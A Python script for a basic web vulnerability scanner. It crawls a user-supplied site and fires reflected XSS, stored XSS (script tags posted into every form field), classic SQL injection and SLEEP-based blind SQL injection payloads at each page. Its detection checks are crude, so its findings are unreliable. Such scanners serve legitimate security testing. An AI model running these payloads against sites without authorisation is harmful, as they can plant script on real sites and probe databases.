import requests 
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from urllib.parse import urljoin, urlparse
import time

# Initialize colorama
init(autoreset=True)

visited = set()
MAX_PAGES = 20  # maximum pages to scan per domain
pages_scanned = 0

def banner():
    print(Fore.CYAN + Style.BRIGHT + "\n=====================================")
    print(Fore.GREEN + "   Web Application Vulnerability Scanner")
    print(Fore.CYAN + "  (XSS, Stored XSS, SQLi & Blind SQLi + Crawler + Timing)")
    print("=====================================\n" + Style.RESET_ALL)

def check_xss(url):
    payload = "<script>alert('XSS')</script>"
    test_url = url + "?q=" + payload
    try:
        start = time.time()
        res = requests.get(test_url, timeout=5)
        duration = round(time.time() - start, 2)
        if payload in res.text:
            print(Fore.RED + f"[!] Possible XSS at: {test_url} (took {duration}s)")
        else:
            print(Fore.GREEN + f"[+] No XSS at: {url} (took {duration}s)")
    except Exception as e:
        print(Fore.YELLOW + "[!] XSS check error:", str(e))

def check_sql_injection(url):
    payload = "' OR '1'='1"
    test_url = url + "?id=" + payload
    try:
        start = time.time()
        res = requests.get(test_url, timeout=5)
        duration = round(time.time() - start, 2)
        if "sql" in res.text.lower() or "mysql" in res.text.lower():
            print(Fore.RED + f"[!] Possible SQLi at: {test_url} (took {duration}s)")
        else:
            print(Fore.GREEN + f"[+] No SQLi at: {url} (took {duration}s)")
    except Exception as e:
        print(Fore.YELLOW + "[!] SQLi check error:", str(e))

# -------------------------
# Stored XSS check
# -------------------------
def check_stored_xss(url):
    payload = "<script>alert('STORED')</script>"
    try:
        res = requests.get(url, timeout=5)
        soup = BeautifulSoup(res.text, "html.parser")
        forms = soup.find_all("form")
        if not forms:
            return

        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = form.find_all("input")
            data = {}
            for i in inputs:
                name = i.get("name")
                if name:
                    data[name] = payload

            target_url = urljoin(url, action)
            if method == "post":
                r = requests.post(target_url, data=data, timeout=5)
            else:
                r = requests.get(target_url, params=data, timeout=5)

            if payload in r.text:
                print(Fore.RED + f"[!] Possible Stored XSS at form: {target_url}")
            else:
                print(Fore.GREEN + f"[+] No Stored XSS detected at: {url}")

    except Exception as e:
        print(Fore.YELLOW + "[!] Stored XSS check error:", str(e))

# -------------------------
# Timing-based Blind SQLi
# -------------------------
def check_timing_sqli(url):
    """
    Detect timing-based (blind) SQLi by checking server response delay
    """
    payload = "' OR IF(1=1, SLEEP(5), 0)-- "
    test_url = url + "?id=" + payload
    try:
        start = time.time()
        res = requests.get(test_url, timeout=10)
        duration = round(time.time() - start, 2)
        if duration >= 5:  # server delayed due to SQL payload
            print(Fore.RED + f"[!] Possible Blind SQLi at: {test_url} (response {duration}s)")
        else:
            print(Fore.GREEN + f"[+] No Blind SQLi at: {url} (response {duration}s)")
    except Exception as e:
        print(Fore.YELLOW + "[!] Timing SQLi check error:", str(e))

# -------------------------
# Crawl function (updated)
# -------------------------
def crawl_and_scan(base_url):
    global pages_scanned
    if pages_scanned >= MAX_PAGES:
        print(Fore.CYAN + f"[i] Reached max scan limit of {MAX_PAGES} pages. Stopping crawl.")
        return

    if base_url in visited:
        return
    visited.add(base_url)
    pages_scanned += 1

    print(Fore.CYAN + f"\n[*] Crawling ({pages_scanned}/{MAX_PAGES}): {base_url}")

    try:
        start = time.time()
        res = requests.get(base_url, timeout=5)
        duration = round(time.time() - start, 2)
        print(Fore.MAGENTA + f"[i] Page loaded in {duration}s")

        soup = BeautifulSoup(res.text, "html.parser")

        # Run vulnerability checks
        check_xss(base_url)
        check_sql_injection(base_url)
        check_stored_xss(base_url)
        check_timing_sqli(base_url)  # <- Blind SQLi added here

        # Extract all links
        for link in soup.find_all("a", href=True):
            full_url = urljoin(base_url, link['href'])
            # scan same domain only
            if urlparse(base_url).netloc in full_url:
                crawl_and_scan(full_url)

    except Exception as e:
        print(Fore.YELLOW + "[!] Crawl error:", str(e))

# -------------------------
# Main
# -------------------------
if __name__ == "__main__":
    banner()
    target = input(Fore.CYAN + "Enter target URL (e.g., http://testphp.vulnweb.com): " + Style.RESET_ALL)
    crawl_and_scan(target)
    print(Fore.GREEN + f"\n[i] Scan completed. Total pages scanned: {pages_scanned}")
